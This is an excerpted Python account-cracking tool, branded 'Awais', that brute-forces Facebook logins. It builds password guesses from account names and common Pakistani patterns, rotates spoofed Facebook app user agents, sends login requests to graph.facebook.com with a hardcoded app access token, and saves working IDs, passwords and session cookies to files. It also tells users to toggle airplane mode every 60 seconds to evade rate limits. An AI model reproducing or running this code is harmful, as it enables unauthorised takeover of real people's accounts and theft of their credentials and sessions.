...
\x1b[1;93m .d8b.  db   d8b   db  .d8b.  d888888b .d8888. 
\x1b[1;91md8' `8b 88   I8I   88 d8' `8b   `88'   88'  YP 
\033[1;97m88ooo88 88   I8I   88 88ooo88    88    `8bo.   
\x1b[1;92m88~~~88 Y8   I8I   88 88~~~88    88      `Y8b. 
\033[1;91m88   88 `8b d8'8b d8' 88   88   .88.   db   8D 
\x1b[1;93mYP   YP  `8b8' `8d8'  YP   YP Y888888P `8888Y' 
                                               
                                               
\x1b[1;92m
--------------------------------------------------
 \033[1;37m[+] Owner : ITX Awais
 [+] Facebook : Awais Soomro
 [+] Tool : FREE
 [+] Tag Line:Aj Jo B Hun Apny Damm pe Hu
 [+] Hetters Mere ____ Pe✈️
\x1b[1;92m--------------------------------------------------""")
...
def file_crack():
	...
	try:
		...
		print('\033[1;37m [+] File location not found ');Main_Awais()
	clear()
	print(' [1] Method 1 ')
	print(' [2] Method 2 ')
	linex()
	...
	with tred(max_workers=30) as Awais:
		os.system('clear')
		print(logo)
		tl = str(len(fo))
		print(' Total accounts : \033[1;32m'+tl)
		print('\033[1;37m LETS GET SOME OK IDZ ')
		print('\033[1;37m USE AIRPLANE MODE EVERY 60 SECONDS')
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if mthd in ['1','01']:
				Awais.submit(api1,ids,names,passlist)
			elif mthd in ['2','02']:
				Awais.submit(api2,ids,names,passlist)
			else:
				Main_Menu()
	print('\033[1;37m')
	linex()
...
def rd(ids, passlist, fbcr):
    try:
        ...
        for pas in passlist:
            ...
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/446.0.0.29.42;FBBV/357914475;FBRV/375920481;FBPN/com.facebook.katana;FBCR/Bangalink;FBLC/en_GB;FBMF/Realme;FBBD/Realme;FBDV/RMX3511;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
...
def rd1(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/144.0.0.50.32;FBBV/1285734;FBDM/{density=3.0,width=1280,height=1280;FBLC/en_GB;FBCR/Bangalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930L;FBSV/6;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/217.0.0.35.152;FBBV/2101245;FBDM/{density=3.0,width=1280,height=2560;FBLC/en_GB;FBRV/545286095;FBCR/Ufone;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/KG8;FBSV/11;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/217.0.0.35.152;FBBV/2101245;FBDM/{density=3.0,width=1280,height=2560;FBLC/en_GB;FBRV/545286095;FBCR/Nepal Telecom;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X652B;FBSV/9;FBCA/armeabi-v7a:armeabi;]"
				...
				if 'session_key' in po:
					...
					if 'LIVE' in get_req:
						print('\r\r\033[1;32m [Awais-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies🍪] : '+cookie)
						open('/sdcard/Awais/Awais-RANDOM-OK.txt','a').write(uid+'|'+pas+'\n')
						open('/sdcard/Awais/Awais-RANDOM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
					if 'DEAD' in get_req:
						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
...
def rd2(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				fbcr = sim_id
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/264.0.0.5.200;FBPN/com.facebook.orca;FBLC/en_US;FBBV/995156052;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 4;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]','[FBAN/FB4A;FBAV/287.0.0.3.172;FBBV/778504345;FBDM/{density=3.0,width=1080,height=1872};FBLC/en_GB;FBRV/374826402;FBCR/Banglalink;FBMF/KYOCERA;FBBD/KYOCERA;FBPN/com.facebook.katana;FBDV/S4-KC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[CRACKING-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					if 'LIVE' in get_req:
						print('\r\r\033[1;32m [Awais-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies] == '+cookie)
						open('/sdcard/Awais/Awais-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
						open('/sdcard/Awais/Awais-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
					if 'DEAD' in get_req:
						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[CRACKING-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbcr = sim_id
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/133.0.0.49.39;FBBV/103844704;FBPN/com.facebook.katana;FBLC/en_GB;FBCR/Ufone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/21081111RG;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.6,width=720,height=1440};FB_FW/1;]','[FBAN/FB4A;FBAV/300.0.0.4.45;FBBV/269235091;FBDM/{density=2.8812501,width=1080,height=2110};FBLC/en_US;FBRV/328595305;FBCR/Ufone;FBMF/Tecno;FBBD/Tecno;FBPN/com.facebook.katana;FBDV/BD2p;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
...
def pak():
	...
	with tred(max_workers=30) as Awais:
		...
		print('\33[1;37m [+] Selected code  :\033[1;97m '+code)
		print('\33[1;37m [+] Process has been started\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [code,psx,ids,'khan123','786787','khan123','khan786','khan1122','pak123','sindhi123']
...
def pak2():
	...
	with tred(max_workers=30) as Awais:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \33[1;37m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;37m '+code)
		print('\33[1;37m [+] Process has been started\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
